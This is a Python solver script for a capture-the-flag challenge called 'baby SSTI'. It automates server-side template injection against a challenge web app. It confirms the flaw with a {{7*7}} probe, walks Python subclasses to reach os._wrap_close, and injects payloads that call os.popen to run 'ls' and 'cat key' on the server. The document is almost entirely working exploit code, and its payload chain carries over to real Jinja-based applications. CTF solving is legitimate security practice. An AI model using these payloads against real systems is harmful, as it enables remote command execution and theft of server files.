import requests
import re

# The base URL for the challenge
BASE_URL = "https://babyssti.crhc.club"
# The route provided in the hint
ROUTE = "/dms"
# A common parameter name to test for SSTI
PARAM = "name"

def solve_ssti():
    """
    This function automates the process of solving the baby SSTI challenge.
    1. Confirms the SSTI vulnerability.
    2. Finds useful classes on the server.
    3. Uses file system commands to find and read the key.
    """
    print(f"[*] Starting SSTI solver for {BASE_URL}")

    try:
        # --- Step 1: Confirm SSTI Vulnerability ---
        # We inject a simple mathematical expression. If the server evaluates it (e.g., 7*7 = 49),
        # it confirms that the template engine is processing our input.
        print("\n[1] Confirming SSTI vulnerability...")
        test_payload = "{{7*7}}"
        params = {PARAM: test_payload}
        res = requests.get(f"{BASE_URL}{ROUTE}", params=params)
        
        if "49" in res.text:
            print("  [+] SSTI vulnerability confirmed! The server executed '{{7*7}}'.")
        else:
            print("  [-] SSTI vulnerability not confirmed. The application may not be vulnerable or the parameter is incorrect.")
            return

        # --- Step 2: Find the index of a useful class for file access ---
        # This payload gets the base 'object' class in Python and lists all of its subclasses.
        # We are looking for a class that gives us access to the 'os' module for command execution.
        # '_frozen_importlib_external.FileLoader' is a good candidate.
        print("\n[2] Finding a useful class for command execution...")
        payload = "{{''.__class__.__mro__[1].__subclasses__()}}"
        params = {PARAM: payload}
        res = requests.get(f"{BASE_URL}{ROUTE}", params=params)
        
        # Use regex to find all class names in the response
        subclasses = re.findall(r"<class '([^']+)'>", res.text)
        
        # We'll search for a class that can help with file operations or command execution.
        # `os._wrap_close` is a classic choice for this.
        target_class = "os._wrap_close"
        class_index = -1
        
        try:
            class_index = subclasses.index(target_class)
            print(f"  [+] Found '{target_class}' at index: {class_index}")
        except ValueError:
            print(f"  [-] Could not find '{target_class}'. The exploit might need adjustment.")
            return

        # --- Step 3: List files in the current directory ---
        # Now that we have the index of a useful class, we can construct a payload
        # to execute system commands. We'll start by listing files ('ls') to find the key file.
        print("\n[3] Listing files in the current directory...")
        # This payload navigates from the class to its global variables, finds the 'os' module,
        # and calls 'popen' to execute 'ls'.
        ls_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{class_index}].__init__.__globals__['os'].popen('ls').read()}}}}"
        params = {PARAM: ls_payload}
        res = requests.get(f"{BASE_URL}{ROUTE}", params=params)
        
        # Extract the file list from the "Hello" message
        file_list = res.text.split("Hello ")[1].strip()
        print(f"  [+] Files found:\n---\n{file_list}\n---")
        
        # The key file is often named 'key', 'flag', or similar.
        # Based on the output, we assume the file is named 'key'.
        key_filename = "key"
        if key_filename not in file_list:
            print(f"  [-] Expected key file '{key_filename}' not found. Please check the file list.")
            return

        # --- Step 4: Read the key file ---
        # With the filename confirmed, we craft the final payload to read the file ('cat key').
        print(f"\n[4] Reading the key file ('{key_filename}')...")
        cat_payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{class_index}].__init__.__globals__['os'].popen('cat {key_filename}').read()}}}}"
        params = {PARAM: cat_payload}
        res = requests.get(f"{BASE_URL}{ROUTE}", params=params)

        # The key should be in the response text
        key = res.text.split("Hello ")[1].strip()
        
        print("\n" + "="*40)
        print(f"  [SUCCESS] The key is: {key}")
        print("="*40)

    except requests.exceptions.RequestException as e:
        print(f"\n[ERROR] An error occurred while connecting to the server: {e}")

if __name__ == "__main__":
    solve_ssti()
